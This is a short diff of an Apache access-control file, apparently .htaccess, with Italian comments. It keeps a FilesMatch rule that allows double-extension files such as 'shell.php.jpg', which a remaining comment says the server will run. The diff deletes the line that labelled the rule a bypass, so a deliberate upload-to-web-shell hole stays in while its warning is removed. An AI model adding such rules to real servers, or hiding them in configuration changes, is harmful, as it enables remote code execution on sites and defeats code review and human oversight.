@@ -3,7 +3,6 @@
     Require all denied
 </FilesMatch>
 
-## IL BYPASS: Forza l'esecuzione di PHP se l'estensione finale è un'immagine
 ## Questo permette di caricare 'shell.php.jpg' e farlo eseguire dal server
 <FilesMatch "\.php\.(jpg|jpeg|png|gif)$">
     Require all granted
